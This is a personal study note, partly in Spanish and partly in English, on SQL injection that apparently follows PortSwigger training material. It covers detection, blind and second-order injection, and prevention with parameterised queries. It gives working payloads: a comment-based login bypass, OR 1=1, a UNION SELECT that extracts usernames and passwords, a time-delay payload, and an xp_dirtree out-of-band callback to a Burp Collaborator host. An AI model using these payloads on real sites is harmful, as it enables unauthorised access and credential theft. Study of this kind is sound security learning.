
Significa comentarios y hace que dropee el resto de la query

```
--
```

De esta manera cuando la pagina performance la login query:

```
SELECT * FROM users WHERE
username = 'administrator'--
#Lo siguiente no se ejecuta:
AND password = ''
#Ejemplo:
administrator'--
```

```
SELECT *  Todos
WHERE ? category = "Gifts"
AND released = 1
```

example:  ...bla.com/products?category=Gifts'--

Esto hace que la pagina tire la parte de AND released=1 y te muestre todos los productos incluso los que no han sido released (released=0):

```
...bla.com/products?category=Gifts'+OR+1=1--
```

Ataque que muestra todos los nombre de usuario y productos:

```
Gifts' UNION SELECT username, password FROM users--
```

## Obtener informacion:

Version:
```
SELECT * FROM v$version
```

Dates bases exist:
```
SELECT * FROM information_schema.tables
```

## Blind SQL inyections

Change logic of the query:
	 Depending of the TRUTH of a single conditon ---> Triggers responses  
	 Including new boolean conditions
	 Triggering a error dividing by 0
	 Conditionally triggers a time delay during the processing of a query ---> Inforce the True of the condition base on the time of the application response
	 Triger an out-of-band network interaction ----> Poweful

## Detecting Vulneralibities

On burp to look for differences on the aplication response:

introducing to look for errors and anomalyes:

```
'
```

Introducing different SQL syntax and look for sistematic differences:

```
ASCII(97)
```

Submit boolean conditions:

```
' OR 1=1--
```

Submit payloads design to try time delays 

```
': waitfor delay ('0:0:20')--
```

Submit payloads desing to trigger outband network interaction:

```
exec master. .xp_dirtree
'//0efdymgwlo5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'
```


## Where to inject in the query

Most common locations:
	UPDATE statements or where clause 
	INSERT statements
	SELECT statements within the table of column name
	SELECT statements within ORDER BY clause 

## Second-order SQL injection 

First order ---> Arises where the application takes the user imput from an HTTP request and in the course of processing the request incorporates the input into an SQL query in a unsafe way.

Second order ---> Also know as stored SQL injection, the application takes user input from an HTTP request and stores it for future use, this is usually done by placing the input into a database, later when handling a different HTTP request the aplication retrieves the store data and incorparates into a SQL query in a unsafe way

## Data base specific factors
	Syntax for string concatenation 
	Comments
	Batched (or stacked) queries 
	Platform-specific APIs
	Error Messages

## Preventing SQL injection

Using parameterised queries instead of string cocatenation within the query, can be use for any situation where untrusted input appears as data within the query:
	WHERE	
	INSERT
	UPDATE
	Table and column names
	ORDER BY clause

Application funtionality that places untrusted data into those parts of the query we'll need to take a different aproach:
	Whitelisting Permitted input values or using different logic to deliver the required behavior

The string using the query must be always hard-coded constant and must never contain any variable data from any origin 

## SQL injection examples

-   [[Retrieving hidden data]], where you can modify a SQL query to return additional results.
-   [[Subverting application logic]], where you can change a query to interfere with the application's logic.
-   [[SQL UNION attacks]], where you can retrieve data from different database tables.
-   [Examining the database](https://portswigger.net/web-security/sql-injection/examining-the-database), where you can extract information about the version and structure of the database.
-   [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind), where the results of a query you control are not returned in the application's responses.

